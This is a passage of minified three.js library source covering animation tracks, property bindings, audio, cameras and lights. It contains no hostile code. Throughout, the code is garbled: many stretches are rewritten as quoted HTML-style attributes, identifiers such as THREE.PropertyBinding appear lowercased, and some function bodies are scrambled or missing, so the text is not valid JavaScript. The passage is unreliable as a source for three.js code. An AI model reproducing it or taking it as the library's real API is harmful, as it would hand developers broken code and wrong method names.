p=c++,m=b[p];d[m.uuid]=\nn;b[n]=m;d[l]=p;b[p]=k;k=0;for(l=f;k!==l;++k){var m=e[k],q=m[n];m[n]=m[p];m[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,k=arguments.length;h!==k;++h){var l=arguments[h].uuid,n=e[l];if(void 0!==n)if(delete e[l],n<d){var 0=\"==f[d];)f=a[e++];if(void\" l=\"--d,p=b[l],m=--c,q=b[m];e[p.uuid]=n;b[n]=p;e[q.uuid]=l;b[l]=q;b.pop();p=0;for(q=g;p!==q;++p){var\" r=\"f[p],s=r[m];r[n]=r[l];r[l]=s;r.pop()}}else\" for(m=\"--c,q=b[m],e[q.uuid]=\" n,b[n]=\"q,b.pop(),p=0,q=g;p!==q;++p)r=f[p],r[n]=r[m],r.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var\" c=\"this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void\" 0!=\"=d)return\" e[d];var=\"\" f=\"this._paths,g=this._parsedPaths,h=this._objects,k=this.nCachedObjects_,l=Array(h.length),d=e.length;c[a]=d;f.push(a);g.push(b);e.push(l);c=k;for(d=h.length;c!==d;++c)l[c]=new\" three.propertybinding(h[c],a,b);return=\"\" l},unsubscribe_:function(a){var=\"\" b=\"this._bindingsIndicesByPath,c=b[a];if(void\" d=\"this._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};\" three.animationutils=\"{arraySlice:function(a,b,c){return\" three.animationutils.istypedarray(a)?new=\"\" a.constructor(a.subarray(b,c)):a.slice(b,c)},convertarray:function(a,b,c){return!a||!c&&a.constructor=\"==b?a:\"number\"===typeof\" b.bytes_per_element?new=\"\" b(a):array.prototype.slice.call(a)},istypedarray:function(a){return=\"\" arraybuffer.isview(a)&&!(a=\"\" instanceof=\"\" dataview)},getkeyframeorder:function(a){for(var=\"\" a[b]-a[c]});return=\"\" c},sortedarray:function(a,=\"\" b,c){for(var=\"\" a.constructor(d),f=\"0,g=0;g!==d;++f)for(var\" h=\"c[f]*b,k=0;k!==b;++k)e[g++]=a[h+k];return\" e},flattenjson:function(a,b,c,d){for(var=\"\" e=\"1,f=a[0];void\" g=\"f[d];if(void\" if(void=\"\" c.push(g)),f=\"a[e++];while(void\" error(\"track=\"\" name=\"\" is=\"\" undefined\");if(void=\"\" error(\"no=\"\" keyframes=\"\" in=\"\" track=\"\" named=\"\" \"+a);this.name=\"a;this.times=THREE.AnimationUtils.convertArray(b,this.TimeBufferType);this.values=THREE.AnimationUtils.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()};\" three.keyframetrack.prototype=\"{constructor:THREE.KeyframeTrack,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodDiscrete:function(a){return\" new=\"\" three.discreteinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodlinear:function(a){return=\"\" three.linearinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodsmooth:function(a){return=\"\" three.cubicinterpolant(this.times,=\"\" this.values,this.getvaluesize(),a)},setinterpolation:function(a){var=\"\" b;switch(a){case=\"\" three.interpolatediscrete:b=\"this.InterpolantFactoryMethodDiscrete;break;case\" three.interpolatelinear:b=\"this.InterpolantFactoryMethodLinear;break;case\" three.interpolatesmooth:b=\"this.InterpolantFactoryMethodSmooth}if(void\" interpolation=\"\" for=\"\" \"+this.valuetypename+\"=\"\" keyframe=\"\" \"+this.name;if(void=\"\" else=\"\" throw=\"\" error(b);console.warn(b)}else=\"\" this.createinterpolant=\"b},getInterpolation:function(){switch(this.createInterpolant){case\" this.interpolantfactorymethoddiscrete:return=\"\" three.interpolatediscrete;case=\"\" this.interpolantfactorymethodlinear:return=\"\" three.interpolatelinear;case=\"\" this.interpolantfactorymethodsmooth:return=\"\" three.interpolatesmooth}},getvaluesize:function(){return=\"\" this.values.length=\"\" this.times.length},shift:function(a){if(0!=\"=a)for(var\" this},=\"\" scale:function(a){if(1!=\"=a)for(var\" this},trim:function(a,b){for(var=\"\">b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=THREE.AnimationUtils.arraySlice(c,e,f),this.values=THREE.AnimationUtils.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",\nthis),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",this),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&THREE.AnimationUtils.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=\nthis.times,b=this.values,c=this.getValueSize(),d=1,e=1,f=a.length-1;e<=f;++e){var 0=\"==a.type)throw\" g=\"!1,h=a[e];if(h!==a[e+1]&&(1!==e||h!==h[0]))for(var\" k=\"e*c,l=k-c,n=k+c,h=0;h!==c;++h){var\" p=\"b[k+h];if(p!==b[l+h]||p!==b[n+h]){g=!0;break}}if(g){if(e!==d)for(a[d]=a[e],g=e*c,k=d*c,h=0;h!==c;++h)b[k+h]=b[g+h];++d}}d!==a.length&&(this.times=THREE.AnimationUtils.arraySlice(a,0,d),this.values=THREE.AnimationUtils.arraySlice(b,0,d*c));return\" this}};=\"\" object.assign(three.keyframetrack,{parse:function(a){if(void=\"\" error(\"track=\"\" type=\"\" undefined,=\"\" can=\"\" not=\"\" parse\");var=\"\" b=\"THREE.KeyframeTrack._getTrackTypeForValueTypeName(a.type);if(void\" c=\"[],d=[];THREE.AnimationUtils.flattenJSON(a.keys,c,d,\"value\");a.times=c;a.values=d}return\" void=\"\" 0!=\"=b.parse?b.parse(a):new\" b(a.name,a.times,a.values,a.interpolation)},tojson:function(a){var=\"\" array),values:three.animationutils.convertarray(a.values,array)},c=\"a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return\" b},_gettracktypeforvaluetypename:function(a){switch(a.tolowercase()){case=\"\" \"scalar\":case=\"\" \"double\":case=\"\" \"float\":case=\"\" \"number\":case=\"\" \"integer\":return=\"\" three.numberkeyframetrack;case=\"\" \"vector\":case=\"\" \"vector2\":case=\"\" \"vector3\":case=\"\" \"vector4\":return=\"\" three.vectorkeyframetrack;case=\"\" \"color\":return=\"\" three.colorkeyframetrack;case=\"\" \"quaternion\":return=\"\" three.quaternionkeyframetrack;=\"\" case=\"\" \"bool\":case=\"\" \"boolean\":return=\"\" three.booleankeyframetrack;case=\"\" \"string\":return=\"\" three.stringkeyframetrack}throw=\"\" error(\"unsupported=\"\" typename:=\"\" \"+a);}});three.propertybinding=\"function(a,b,c){this.path=b;this.parsedPath=c||THREE.PropertyBinding.parseTrackName(b);this.node=THREE.PropertyBinding.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a};\" three.propertybinding.prototype=\"{constructor:THREE.PropertyBinding,getValue:function(a,b){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var\" a=\"this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=THREE.PropertyBinding.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var\" f=\"b.objectIndex;switch(c){case\" \"materials\":if(!a.material){console.error(\"=\"\" bind=\"\" to=\"\" material=\"\" as=\"\" node=\"\" does=\"\" have=\"\" material\",=\"\" this);return}if(!a.material.materials){console.error(\"=\"\" material.materials=\"\" node.material=\"\" materials=\"\" array\",this);return}a=\"a.material.materials;break;case\" \"bones\":if(!a.skeleton){console.error(\"=\"\" bones=\"\" skeleton\",this);return}a=\"a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void\" objectname=\"\" of=\"\" node,=\"\" undefined\",this);return}a=\"a[c]}if(void\" a[f]){console.error(\"=\"\" trying=\"\" objectindex=\"\" objectname,=\"\" but=\"\" is=\"\" undefined:\",this,a);return}a=\"a[f]}}f=a[d];if(void\" update=\"\" property=\"\" for=\"\" track:=\"\" \"+b.nodename+\".\"+d+\"=\"\" it=\"\" wasn't=\"\" found.\",a);else{b=\"this.Versioning.None;void\" d){if(!a.geometry){console.error(\"=\"\" morphtargetinfluences=\"\" becasuse=\"\" geometry\",this);return}if(!a.geometry.morphtargets){console.error(\"=\"\" geometry.morphtargets\",this);return}for(c=\"0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else\" (c=\"this.BindingType.HasFromToArray,this.resolvedProperty=f):void\" console.error(\"=\"\" \"+this.path+\"=\"\" found.\")},unbind:function(){this.node=\"null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};\" object.assign(three.propertybinding.prototype,{_getvalue_unavailable:function(){},_setvalue_unavailable:function(){},_getvalue_unbound:three.propertybinding.prototype.getvalue,_setvalue_unbound:three.propertybinding.prototype.setvalue,bindingtype:{direct:0,entirearray:1,arrayelement:2,hasfromtoarray:3},versioning:{none:0,needsupdate:1,matrixworldneedsupdate:2},getterbybindingtype:[function(a,b){a[b]=\"this.node[this.propertyName]},function(a,b){for(var\" c[d]},function(a,b){a[b]=\"this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var\" d=\"0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var\" b)},function(a,b){this.resolvedproperty.fromarray(a,b);this.targetobject.needsupdate=\"!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});THREE.PropertyBinding.Composite=function(a,b,c){c=c||THREE.PropertyBinding.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};\" three.propertybinding.composite.prototype=\"{constructor:THREE.PropertyBinding.Composite,getValue:function(a,b){this.bind();var\" instanceof=\"\" three.animationobjectgroup?new=\"\" three.propertybinding.composite(a,b,c):new=\"\" three.propertybinding(a,b,c)};=\"\" three.propertybinding.parsetrackname=\"function(a){var\" ]+)\\])?)?(\\.([\\w.]+)(\\[([\\w\\d\\[\\]\\_.=\"\" ]+)\\])?)$=\"\" ,c=\"b.exec(a);if(!c)throw\" error(\"cannot=\"\" parse=\"\" trackname=\"\" at=\"\" all:=\"\" \"+a);c.index=\"==b.lastIndex&&b.lastIndex++;b={nodeName:c[3],objectName:c[5],objectIndex:c[7],propertyName:c[9],propertyIndex:c[11]};if(null===b.propertyName||0===b.propertyName.length)throw\" error(\"can=\"\" propertyname=\"\" from=\"\" trackname:=\"\" \"+a);return=\"\" b};=\"\" three.propertybinding.findnode=\"function(a,b){if(!b||\"\"===b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return\" a;if(a.skeleton){var=\"\" d}return=\"\" null}(a.skeleton);if(c)return=\"\" c}if(a.children){var=\"\" g}return=\"\" null};if(c=\"d(a.children))return\" c}return=\"\" null};=\"\" three.propertymixer=\"function(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case\" \"quaternion\":b=\"this._slerp;break;case\" \"string\":case=\"\" \"bool\":a=\"Array;b=this._select;break;default:b=this._lerp}this.buffer=new\" a(4*c);this._mixbufferregion=\"b;this.referenceCount=this.useCount=this.cumulativeWeight=0};\" three.propertymixer.prototype=\"{constructor:THREE.PropertyMixer,accumulate:function(a,b){var\" f+=\"b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var\">d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);\nbreak}},saveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){three.quaternion.slerpflat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var 0=\"==a&&(a=new\" f=\"1-d,g=0;g!==e;++g){var\" h=\"b+g;a[h]=a[h]*f+a[c+g]*d}}};\" three.booleankeyframetrack=\"function(a,b,c){THREE.KeyframeTrack.call(this,a,b,c)};THREE.BooleanKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.BooleanKeyframeTrack,ValueTypeName:\"bool\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void\" 0,interpolantfactorymethodsmooth:void=\"\" 0});three.colorkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.colorkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.ColorKeyframeTrack,ValueTypeName:\"color\"});THREE.NumberKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};THREE.NumberKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.NumberKeyframeTrack,ValueTypeName:\"number\"});THREE.QuaternionKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.quaternionkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.QuaternionKeyframeTrack,ValueTypeName:\"quaternion\",DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodLinear:function(a){return\" new=\"\" three.quaternionlinearinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodsmooth:void=\"\" 0});three.stringkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.stringkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.StringKeyframeTrack,ValueTypeName:\"string\",ValueBufferType:Array,DefaultInterpolation:THREE.InterpolateDiscrete,InterpolantFactoryMethodLinear:void\" 0});three.vectorkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.vectorkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.VectorKeyframeTrack,ValueTypeName:\"vector\"});\" three.audio=\"function(a){THREE.Object3D.call(this);this.type=\"Audio\";this.context=a.context;this.source=this.context.createBufferSource();this.source.onended=this.onEnded.bind(this);this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]};\" three.audio.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Audio,getOutput:function(){return\" this.gain},setnodesource:function(a){this.hasplaybackcontrol=\"!1;this.sourceType=\"audioNode\";this.source=a;this.connect();return\" this},setbuffer:function(a){this.source.buffer=\"a;this.sourceType=\"buffer\";this.autoplay&&this.play();return\" this},play:function(){if(!0=\"==this.isPlaying)console.warn(\"THREE.Audio:\" audio=\"\" is=\"\" already=\"\" playing.\");else=\"\" if(!1=\"==this.hasPlaybackControl)console.warn(\"THREE.Audio:\" this=\"\" has=\"\" no=\"\" playback=\"\" control.\");=\"\" else{var=\"\" a=\"this.context.createBufferSource();a.buffer=this.source.buffer;a.loop=this.source.loop;a.onended=this.source.onended;a.start(0,this.startTime);a.playbackRate.value=this.playbackRate;this.isPlaying=!0;this.source=a;return\" this.connect()}},pause:function(){if(!1=\"==this.hasPlaybackControl)console.warn(\"THREE.Audio:\" control.\");else=\"\" return=\"\" this.source.stop(),this.starttime=\"this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\"THREE.Audio:\" else=\"\" this.source.connect(this.getoutput());return=\"\" this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var=\"\" 1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getoutput())}else=\"\" this.source.disconnect(this.getoutput());return=\"\" this},getfilters:function(){return=\"\" this.filters},setfilters:function(a){a||(a=\"[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return\" this},getfilter:function(){return=\"\" this.getfilters()[0]},setfilter:function(a){return=\"\" this.setfilters(a?[a]:[])},setplaybackrate:function(a){if(!1=\"==this.hasPlaybackControl)console.warn(\"THREE.Audio:\" this.playbackrate=\"a,!0===this.isPlaying&&(this.source.playbackRate.value=this.playbackRate),this},getPlaybackRate:function(){return\" this.playbackrate},onended:function(){this.isplaying=\"!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\"THREE.Audio:\" control.\"),!1):this.source.loop},setloop:function(a){!1=\"==this.hasPlaybackControl?console.warn(\"THREE.Audio:\" control.\"):this.source.loop=\"a},getVolume:function(){return\" this.gain.gain.value},=\"\" setvolume:function(a){this.gain.gain.value=\"a;return\" this}});three.audioanalyser=\"function(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void\" 0!=\"=b?b:2048;this.data=new\" uint8array(this.analyser.frequencybincount);a.getoutput().connect(this.analyser)};=\"\" object.assign(three.audioanalyser.prototype,{getfrequencydata:function(){this.analyser.getbytefrequencydata(this.data);return=\"\" this.data},getaveragefrequency:function(){for(var=\"\" b.length}});object.defineproperty(three,\"audiocontext\",{get:function(){var=\"\" a;return=\"\" function(){void=\"\" (window.audiocontext||window.webkitaudiocontext));return=\"\" a}}()});=\"\" three.positionalaudio=\"function(a){THREE.Audio.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)};\" three.positionalaudio.prototype=\"Object.assign(Object.create(THREE.Audio.prototype),{constructor:THREE.PositionalAudio,getOutput:function(){return\" this.panner},getrefdistance:function(){return=\"\" this.panner.refdistance},setrefdistance:function(a){this.panner.refdistance=\"a},getRolloffFactor:function(){return\" this.panner.rollofffactor},setrollofffactor:function(a){this.panner.rollofffactor=\"a},getDistanceModel:function(){return\" this.panner.distancemodel},setdistancemodel:function(a){this.panner.distancemodel=\"a},getMaxDistance:function(){return\" this.panner.maxdistance},setmaxdistance:function(a){this.panner.maxdistance=\"a},updateMatrixWorld:function(){var\" three.vector3;return=\"\" function(b){three.object3d.prototype.updatematrixworld.call(this,b);a.setfrommatrixposition(this.matrixworld);this.panner.setposition(a.x,a.y,a.z)}}()});=\"\" three.audiolistener=\"function(){THREE.Object3D.call(this);this.type=\"AudioListener\";this.context=THREE.AudioContext;this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null};\" three.audiolistener.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.AudioListener,getInput:function(){return\" this.gain},removefilter:function(){null!=\"=this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return\" this.filter},setfilter:function(a){null!=\"=this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):\" this.gain.disconnect(this.context.destination);this.filter=\"a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return\" this.gain.gain.value},setmastervolume:function(a){this.gain.gain.value=\"a},updateMatrixWorld:function(){var\" three.vector3,b=\"new\" three.quaternion,c=\"new\" three.vector3,d=\"new\" function(e){three.object3d.prototype.updatematrixworld.call(this,e);e=\"this.context.listener;var\" b,c);d.set(0,0,-1).applyquaternion(b);e.setposition(a.x,a.y,a.z);e.setorientation(d.x,d.y,d.z,f.x,f.y,f.z)}}()});three.camera=\"function(){THREE.Object3D.call(this);this.type=\"Camera\";this.matrixWorldInverse=new\" three.matrix4;this.projectionmatrix=\"new\" three.matrix4};three.camera.prototype=\"Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.constructor=THREE.Camera;\" three.camera.prototype.getworlddirection=\"function(){var\" three.quaternion;return=\"\" function(b){b=\"b||new\" three.vector3;this.getworldquaternion(a);return=\"\" b.set(0,0,-1).applyquaternion(a)}}();three.camera.prototype.lookat=\"function(){var\" three.matrix4;return=\"\" function(b){a.lookat(this.position,b,this.up);this.quaternion.setfromrotationmatrix(a)}}();three.camera.prototype.clone=\"function(){return(new\" this.constructor).copy(this)};=\"\" three.camera.prototype.copy=\"function(a){THREE.Object3D.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);return\" this};=\"\" three.cubecamera=\"function(a,b,c){THREE.Object3D.call(this);this.type=\"CubeCamera\";var\" d=\"new\" three.perspectivecamera(90,1,a,b);d.up.set(0,-1,0);d.lookat(new=\"\" three.vector3(1,0,0));this.add(d);var=\"\" e=\"new\" three.perspectivecamera(90,1,a,b);e.up.set(0,-1,0);e.lookat(new=\"\" three.vector3(-1,0,0));this.add(e);var=\"\" three.perspectivecamera(90,1,a,b);f.up.set(0,0,1);f.lookat(new=\"\" three.vector3(0,1,0));this.add(f);var=\"\" g=\"new\" three.perspectivecamera(90,1,a,b);g.up.set(0,0,-1);g.lookat(new=\"\" three.vector3(0,-1,0));=\"\" this.add(g);var=\"\" three.perspectivecamera(90,1,a,b);h.up.set(0,-1,0);h.lookat(new=\"\" three.vector3(0,0,1));this.add(h);var=\"\" k=\"new\" three.perspectivecamera(90,1,a,b);k.up.set(0,-1,0);k.lookat(new=\"\" three.vector3(0,0,-1));this.add(k);this.rendertarget=\"new\" three.webglrendertargetcube(c,c,{format:three.rgbformat,magfilter:three.linearfilter,minfilter:three.linearfilter});this.updatecubemap=\"function(a,b){null===this.parent&&this.updateMatrixWorld();var\" c=\"this.renderTarget,m=c.texture.generateMipmaps;c.texture.generateMipmaps=\" !1;c.activecubeface=\"0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=m;c.activeCubeFace=5;a.render(b,k,c);a.setRenderTarget(null)}};THREE.CubeCamera.prototype=Object.create(THREE.Object3D.prototype);THREE.CubeCamera.prototype.constructor=THREE.CubeCamera;\" three.orthographiccamera=\"function(a,b,c,d,e,f){THREE.Camera.call(this);this.type=\"OrthographicCamera\";this.zoom=1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void\" three.orthographiccamera.prototype=\"Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.OrthographicCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=null===a.view?null:Object.assign({},a.view);return\" this},setviewoffset:function(a,b,c,d,e,f){this.view=\"{fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},\" clearviewoffset:function(){this.view=\"null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var\" a}});=\"\" three.perspectivecamera=\"function(a,b,c,d){THREE.Camera.call(this);this.type=\"PerspectiveCamera\";this.fov=void\" three.perspectivecamera.prototype=\"Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.PerspectiveCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return\" this},setfocallength:function(a){a=\".5*this.getFilmHeight()/a;this.fov=2*THREE.Math.RAD2DEG*Math.atan(a);\" this.updateprojectionmatrix()},getfocallength:function(){var=\"\" 2*three.math.rad2deg*math.atan(math.tan(.5*three.math.deg2rad*this.fov)=\"\" this.zoom)},getfilmwidth:function(){return=\"\" this.filmgauge*math.min(this.aspect,1)},getfilmheight:function(){return=\"\" this.filmgauge=\"\" math.max(this.aspect,1)},setviewoffset:function(a,b,c,d,e,f){this.aspect=\"a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,\" width:e,height:f};this.updateprojectionmatrix()},clearviewoffset:function(){this.view=\"null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var\" three.object3d.prototype.tojson.call(this,a);a.object.fov=\"this.fov;a.object.zoom=this.zoom;a.object.near=this.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return\" three.stereocamera=\"function(){this.type=\"StereoCamera\";this.aspect=1;this.cameraL=new\" three.perspectivecamera;this.cameral.layers.enable(1);this.cameral.matrixautoupdate=\"!1;this.cameraR=new\" three.perspectivecamera;this.camerar.layers.enable(2);this.camerar.matrixautoupdate=\"!1};\" object.assign(three.stereocamera.prototype,{update:function(){var=\"\" a,b,c,d,e,f=\"new\" three.matrix4,g=\"new\" function(h){if(a!=\"=h.focus||b!==h.fov||c!==h.aspect*this.aspect||d!==h.near||e!==h.far){a=h.focus;b=h.fov;c=h.aspect*this.aspect;d=h.near;e=h.far;var\" p=\"-n*c-l;m=n*c-l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraR.projectionMatrix.copy(k)}this.cameraL.matrixWorld.copy(h.matrixWorld).multiply(g);this.cameraR.matrixWorld.copy(h.matrixWorld).multiply(f)}}()});THREE.Light=function(a,b){THREE.Object3D.call(this);this.type=\"Light\";this.color=new\" three.color(a);this.intensity=\"void\" 0};=\"\" three.light.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Light,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return\" this},tojson:function(a){a=\"THREE.Object3D.prototype.toJSON.call(this,a);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void\" this.angle&&(a.object.angle=\"this.angle);void\" a}});three.lightshadow=\"function(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new\" three.vector2(512,512);this.map=\"null;this.matrix=new\" three.matrix4};object.assign(three.lightshadow.prototype,{copy:function(a){this.camera=\"a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)}});=\"\" three.ambientlight=\"function(a,b){THREE.Light.call(this,a,b);this.type=\"AmbientLight\";this.castShadow=void\" 0};three.ambientlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.AmbientLight});THREE.DirectionalLight=function(a,b){THREE.Light.call(this,a,b);this.type=\"DirectionalLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new\" three.object3d;this.shadow=\"new\" three.directionallightshadow};=\"\" three.directionallight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.DirectionalLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return\" this}});three.directionallightshadow=\"function(a){THREE.LightShadow.call(this,new\" three.orthographiccamera(-5,5,5,-5,.5,500))};three.directionallightshadow.prototype=\"Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.DirectionalLightShadow});\" three.hemispherelight=\"function(a,b,c){THREE.Light.call(this,a,c);this.type=\"HemisphereLight\";this.castShadow=void\" 0;this.position.set(0,1,0);this.updatematrix();this.groundcolor=\"new\" three.color(b)};three.hemispherelight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.HemisphereLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return\" this}});=\"\" three.pointlight=\"function(a,b,c,d){THREE.Light.call(this,a,b);this.type=\"PointLight\";Object.defineProperty(this,\"power\",{get:function(){return\" 4*this.intensity*math.pi},set:function(a){this.intensity=\"a/(4*Math.PI)}});this.distance=void\" three.lightshadow(new=\"\" three.perspectivecamera(90,1,.5,500))};=\"\" three.pointlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.PointLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.distance=a.distance;this.decay=a.decay;this.shadow=a.shadow.clone();return\" three.spotlight=\"function(a,b,c,d,e,f){THREE.Light.call(this,a,b);this.type=\"SpotLight\";this.position.set(0,1,0);this.updateMatrix();this.target=new\" three.object3d;object.defineproperty(this,\"power\",{get:function(){return=\"\" this.intensity*math.pi},set:function(a){this.intensity=\"a/Math.PI}});this.distance=void\" three.spotlightshadow};=\"\" 